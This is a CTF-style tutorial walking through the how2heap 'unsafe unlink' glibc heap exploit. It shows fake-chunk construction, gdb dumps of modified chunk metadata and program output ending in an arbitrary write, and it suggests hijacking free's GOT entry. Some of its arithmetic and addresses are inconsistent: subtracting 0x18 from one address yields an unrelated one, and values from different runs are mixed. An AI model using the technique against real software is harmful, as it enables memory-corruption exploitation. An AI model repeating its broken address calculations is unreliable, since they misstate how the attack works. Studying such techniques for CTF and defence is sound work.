# Shellphish how2heap unsafe unlink

This is another section from the CTF team Shellphish's how2heap repo. This section is on using an unsafe unlink to get an arbitrary write.

For an example of a ctf problem that uses this, check out: https://github.com/guyinatuxedo/ctf/tree/master/Hitcon16/pwn/sleepyholder

## Process

First we allocate two chunks of size `0x80`:

```
0:	0x80:	0x5652c6b51010
1:	0x80:	0x5652c6b510a0
```
#### Fake Chunk

Chunk `0` is stored in the global variables (bss) section in the address `0x5652c6b510a0`. The first step of this process is that we will create a fake chunk and store it in chunk `0`. This fake chunk will contain the following data:

```
0x0:	0x0
0x8:	0x8
0x10:	fd:	0x5652c6b510a0 - 0x18 = 0x0000555555756018
0x18:	bk:	0x5652c6b510a0 - 0x10 = 0x0000555555756020
```

The `fd` and `bk` values are there to pass the check `(P->fd->bk != P || P->bk->fd != P) == False`.   For this to work, we will need to have fd be `0x5652c6b510a0 - 0x18 = 0x0000555555756018`, since with that check it will be looking for the value 3 qwords forward. In addition to that, we will need bk to be equal to `0x5652c6b510a0 - 0x10 = 0x0000555555756020` since with that check it will be looking for the value 2 qwords forward. 

The `0x8` is there because since chunk pointers are 8 bytes in 64 bit enviornments, the check `*(chunk0_ptr + x) = x` needs that value there so `*(chun0_ptr + 8) = 8`. For the first QWORD, by that check again we would have to put zero so `(chun0_ptr + 8) = 8`.

#### Chunk 1 Metadata

Since we now have our fake chunk, we can go ahead and alter the metadata for chunk `1`. Right not the metadata (chunk header) looks like this:
```
gdb-peda$ x/4g 0x555555757090
0x555555757090:	0x0000000000000000	0x0000000000000091
0x5555557570a0:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/t 0x555555757098
0x555555757098:	10010001
```

We can see that the `previous_size` value at `0x555555757090` is `0x0`. and that the previous in use bit is on at `0x555555757098` (this bit is the least signifcant bit, which we can see is on). We will now change the `previous_size` to be `0x80` and the `previous_in_use_bit` to be 0 (this can be done in a program with a heap overflow, double free, or some other vulnerabillity):

```
gdb-peda$ x/4g 0x555555757090
0x555555757090:	0x0000000000000080	0x0000000000000090
0x5555557570a0:	0x0000000000000000	0x0000000000000000
```

Now the reason why we overwrote `previous_size` to be `0x80` is that it will go back to the start of our fake chunk to start the unlink. We can see that at exactly `0x555555757090 - 0x80 = 0x555555757010` is the start of our fake chunk:

```
gdb-peda$ x/4g 0x555555757010
0x555555757010:	0x0000000000000000	0x0000000000000008
0x555555757020:	0x0000555555756018	0x0000555555756020
```

#### Unlink Write

Now that we have prepared the fake chunk, and chunk `1's` metadata, we can go ahead and free chunk `1` which will cause the unsafe unlink and write over the global variable `0x5652c6b510a0` with `0x0000555555756018`. 

Proceeding that you can write over the actual value of the bss variable by writing `0x18` bytes of data, followed by whatever you want to write over it with. That is because that global variable now points to itself minus `0x18`. With this we can effictively make a pointer to whatever we want to (provided we know the address of what we are pointing to). In the example code, they make a pointer to a local char array. However you can make a ptr (pointer) to other areas such as the got address of the function `free`, that way you can write to it and have a different function called whenever `free` is supposed to be called.

#### Example Running

Below you can see the code for the section running:
```
$	./unsafe_unlink 
Welcome to unsafe unlink 2.0!
Tested in Ubuntu 14.04/16.04 64bit.
This technique can be used when you have a pointer at a known location to a region you can call unlink on.
The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.
The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.

The global chunk0_ptr is at 0x5652c5e17030, pointing to 0x5652c6b51010
The victim chunk we are going to corrupt is at 0x5652c6b510a0

We create a fake chunk inside chunk0.
We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.
We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.
With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False
Fake chunk fd: 0x5652c5e17018
Fake chunk bk: 0x5652c5e17020

We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (chunk+size)
With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False
P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&(~ 0x7))
If x = chunk0_ptr[1] & (~ 0x7), that is x = *(chunk0_ptr + x).
We just need to set the *(chunk0_ptr + x) = x, so we can pass the check
1.Now the x = chunk0_ptr[1]&(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing
2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass
3.Finally we can also set chunk0_ptr[1] = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20
In this case we set the 'size' of our fake chunk so that chunk0_ptr + size (0x5652c6b51018) == chunk0_ptr->size (0x5652c6b51018)
You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30

We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.
We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.

Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.
You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344

At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
Original value: Hello!~
New Value: BBBBAAAA
```
